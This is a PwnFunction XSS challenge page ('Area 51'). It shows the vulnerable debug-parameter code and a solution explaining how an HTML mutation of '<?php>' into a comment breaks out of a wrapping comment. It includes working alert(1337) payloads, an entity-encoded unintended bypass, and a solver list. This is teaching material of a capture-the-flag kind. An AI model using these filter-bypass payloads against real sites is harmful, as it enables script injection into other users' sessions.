---
title: "XSS Game - Area 51 | PwnFunction"
header: "Area 51"
challengeUrl: "https://sandbox.pwnfunction.com/challenges/area-51.html"
date: 2020-01-19T14:59:07+05:30
draft: false
type: challenge
difficulty: Easy
solvers: 23
---

<!-- Rules -->
{{< rules >}}
<li>Difficulty is <b>Easy</b>.</li>
<li>Pop an <code>alert(1337)</code> on <code>sandbox.pwnfunction.com</code>.</li>
<li>No user interaction.</li>
<li>Cannot use <code>https://sandbox.pwnfunction.com/?html=&js=&css=</code>.</li>
<li>Tested on <b>Chrome</b>.</li>
<li>Unintended solution? DM me <a target="_blank"
                            href="https://twitter.com/messages/compose?recipient_id=1084132461133451264"
                            class="function">@PwnFunction</a>.
                    </li>
{{</ rules >}}

<!-- Challenge Code -->
{{< code >}}<code class="language-markup">&#x3C;!-- Challenge --&#x3E;
&#x3C;div id=&#x22;pwnme&#x22;&#x3E;&#x3C;/div&#x3E;

&#x3C;script&#x3E;
    var input = (new URL(location).searchParams.get(&#x27;debug&#x27;) || &#x27;&#x27;).replace(/[\!\-\/\#\&#x26;\;\%]/g, &#x27;_&#x27;);
    var template = document.createElement(&#x27;template&#x27;);
    template.innerHTML = input;
    pwnme.innerHTML = &#x22;&#x3C;!-- &#x3C;p&#x3E; DEBUG: &#x22; + template.outerHTML + &#x22; &#x3C;/p&#x3E; --&#x3E;&#x22;;
&#x3C;/script&#x3E;</code>{{< /code >}}

<!-- Solution Modal -->
{{< solution >}}
<h3>Intended</h3>
<p>The value of the GET parameter <code>debug</code> ends up inside a comment which is then inserted
    to the DOM via <code>innerHTML</code>. The problem is that, there's a filter, which removes
    <code>!-/#&;%</code> characters. But <code>&lt;php&gt;</code> it mutates into
    <code>&lt;!--php--&gt;</code>, because browsers don't like to render PHP source if sent
    accidentally. This mutation creates new comment, which will be nested inside the already
    existing one. However there's no concept of nested comments in HTML, hence the new comment
    breaks the old comment and lets us execute Javascript. <a
        href="https://www.w3.org/TR/html52/syntax.html#tag-open-state" target="_blank"
        class="function">Read more</a></p>

<pre class="solution-code-block"><code class="language-markup">&lt;?php&gt;&lt;svg onload=alert(1337)&gt;

&lt;!-- Also works because, &lt;?&gt; is short for &lt;php&gt; --&gt;
&lt;?&gt;&lt;svg onload=alert(1337)&gt;</code></pre>

<br>
<h3>Unintended (<a href="https://twitter.com/@terjanq" target="_blank">@terjanq</a>)</h3>
<p>Initially, I had forgotton about blocking HTML entity characters like <code>&#;</code>, So
    @terjanq was able to solve it. However this was fixed soon.</p>
<pre
    class="solution-code-block"><code class="language-markup">&#x3C;svg&#x3E;&#x3C;b title=&#x22;&#x26;#x2D;&#x26;#x2D;&#x26;#x3E;&#x26;#x3C;&#x26;#x73;&#x26;#x76;&#x26;#x67;&#x26;#x2F;&#x26;#x6F;&#x26;#x6E;&#x26;#x6C;&#x26;#x6F;&#x26;#x61;&#x26;#x64;&#x26;#x3D;&#x26;#x61;&#x26;#x6C;&#x26;#x65;&#x26;#x72;&#x26;#x74;&#x26;#x28;&#x26;#x29;&#x26;#x3E;&#x22;&#x3E;aaa</code></pre>
{{< /solution >}}

<!-- Solvers -->
{{< solvers >}}
<tr>
    <th scope="row">1</th>
    <td><a href="https://twitter.com/@terjanq" target="_blank" class="function">@terjanq</a>
    </td>
    <td>Unintended(fixed) & Intended</td>
</tr>
<tr>
    <th scope="row">2</th>
    <td><a href="https://twitter.com/@SecurityMB" target="_blank"
            class="function">@SecurityMB</a></td>
    <td>Intended</td>
</tr>
<tr>
    <th scope="row">3</th>
    <td><a href="https://twitter.com/@k33r0k" target="_blank" class="function">@k33r0k</a>
    </td>
    <td>Intended</td>
</tr>
<tr>
    <th scope="row">4</th>
    <td><a href="https://twitter.com/@bscarvell" target="_blank"
            class="function">@bscarvell</a>
    </td>
    <td>Intended</td>
</tr>
<tr>
    <th scope="row">5</th>
    <td><a href="https://twitter.com/@bitcoinctf" target="_blank"
            class="function">@bitcoinctf</a>
    </td>
    <td>Intended</td>
</tr>
<tr>
    <th scope="row">6</th>
    <td><a href="https://twitter.com/@eissen5c" target="_blank"
            class="function">@eissen5c</a>
    </td>
    <td>Intended</td>
</tr>
<tr>
    <th scope="row">7</th>
    <td><a href="https://twitter.com/@swornim00" target="_blank"
            class="function">@swornim00</a>
    </td>
    <td>Intended</td>
</tr>
<tr>
    <th scope="row">8</th>
    <td><a href="https://twitter.com/@StructHack" target="_blank"
            class="function">@StructHack</a>
    </td>
    <td>Intended</td>
</tr>
<tr>
    <th scope="row">9</th>
    <td><a href="https://twitter.com/@DimitarRusev8" target="_blank"
            class="function">@DimitarRusev8</a>
    </td>
    <td>Intended</td>
</tr>
<tr>
    <th scope="row">10</th>
    <td><a href="https://twitter.com/@justinsteven" target="_blank"
            class="function">@justinsteven</a>
    </td>
    <td>Intended</td>
</tr>
<tr>
    <th scope="row">11</th>
    <td><a href="https://twitter.com/@garethheyes" target="_blank"
            class="function">@garethheyes</a>
    </td>
    <td>Intended</td>
</tr>
<tr>
    <th scope="row">12</th>
    <td><a href="https://twitter.com/@raadfhaddad" target="_blank"
            class="function">@raadfhaddad</a>
    </td>
    <td>Intended</td>
</tr>
<tr>
    <th scope="row">13</th>
    <td><a href="https://twitter.com/@d0ug4n" target="_blank" class="function">@d0ug4n</a>
    </td>
    <td>Intended</td>
</tr>
<tr>
    <th scope="row">14</th>
    <td><a href="https://twitter.com/@l0wb10w" target="_blank" class="function">@l0wb10w</a>
    </td>
    <td>Intended</td>
</tr>
<tr>
    <th scope="row">15</th>
    <td><a href="https://twitter.com/@vincd8" target="_blank" class="function">@vincd8</a>
    </td>
    <td>Intended</td>
</tr>
<tr>
    <th scope="row">16</th>
    <td><a href="https://twitter.com/@0xA1F1E" target="_blank" class="function">@0xA1F1E</a>
    </td>
    <td>Intended</td>
</tr>
<tr>
    <th scope="row">17</th>
    <td><a href="https://twitter.com/@gustavorobertux" target="_blank"
            class="function">@gustavorobertux</a>
    </td>
    <td>Intended</td>
</tr>
<tr>
    <th scope="row">18</th>
    <td><a href="https://twitter.com/@zer0ttl" target="_blank" class="function">@zer0ttl</a>
    </td>
    <td>Intended</td>
</tr>
<tr>
    <th scope="row">19</th>
    <td><a href="https://twitter.com/@_nunohumberto" target="_blank"
            class="function">@_nunohumberto</a>
    </td>
    <td>Intended</td>
</tr>
<tr>
    <th scope="row">20</th>
    <td><a href="https://twitter.com/@simps0n" target="_blank" class="function">@simps0n</a>
    </td>
    <td>Intended</td>
</tr>
<tr>
    <th scope="row">21</th>
    <td><a href="https://twitter.com/@vdvcoder" target="_blank"
            class="function">@vdvcoder</a>
    </td>
    <td>Intended</td>
</tr>
<tr>
    <th scope="row">22</th>
    <td><a href="https://twitter.com/@joaogouveia143" target="_blank"
            class="function">@joaogouveia143</a>
    </td>
    <td>Intended</td>
</tr>
<tr>
    <th scope="row">23</th>
    <td><a href="https://twitter.com/@insertScript" target="_blank"
            class="function">@insertScript</a>
    </td>
    <td>Intended</td>
</tr>
{{< /solvers >}}